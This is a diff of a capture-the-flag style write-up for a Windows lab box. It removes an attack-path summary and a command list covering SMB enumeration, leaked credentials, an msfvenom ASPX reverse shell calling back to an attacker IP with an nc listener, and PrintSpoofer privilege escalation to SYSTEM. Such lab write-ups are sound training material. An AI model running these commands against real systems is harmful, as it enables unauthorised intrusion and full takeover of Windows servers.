@@ -6,7 +6,6 @@
 
 ## 1. Enumeration
 
-بدأت بفحص جميع الـTCP ports مع service/version detection وdefault scripts:
 
 ```bash
 nmap -T5 -p- -sVC 10.113.177.163
@@ -226,69 +225,5 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-# Attack Path Summary
-
-```text
-Nmap
-  |
-  +--> SMB (445)
-        |
-        +--> nt4wrksv share
-              |
-              +--> passwords.txt
-              |      |
-              |      +--> Bob credentials
-              |      +--> Bill credentials
-              |
-              +--> READ/WRITE
-                    |
-                    +--> upload shell.aspx
-                          |
-                          +--> IIS on 49663
-                                |
-                                +--> Reverse shell
-                                      |
-                                      +--> SeImpersonatePrivilege
-                                            |
-                                            +--> PrintSpoofer64
-                                                  |
-                                                  +--> NT AUTHORITY\\SYSTEM
-                                                        |
-                                                        +--> root.txt
-```
-
-## Key Commands Used
-
-### Enumeration
-
-```bash
-nmap -T5 -p- -sVC 10.113.177.163
-smbclient -L \\10.113.177.163 -N
-smbclient //10.113.177.163/nt4wrksv -N
-smbmap -H 10.113.177.163 -u Bob -p '<BOB_PASSWORD>'
-smbmap -H 10.113.177.163 -u Bill -p '<BILL_PASSWORD>'
-```
-
-### Web / IIS
-
-```bash
-curl -i http://10.113.177.163:49663/nt4wrksv/passwords.txt
-```
-
-### Payload / Initial Shell
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.193.30 LPORT=4444 -f aspx -o shell.aspx
-nc -lvnp 4444
-curl -i http://10.113.177.163:49663/nt4wrksv/shell.aspx
-```
-
-### Privilege Escalation
-
-```cmd
-whoami
-whoami /priv
-C:\Windows\Temp\PrintSpoofer64.exe -i -c cmd.exe
-whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
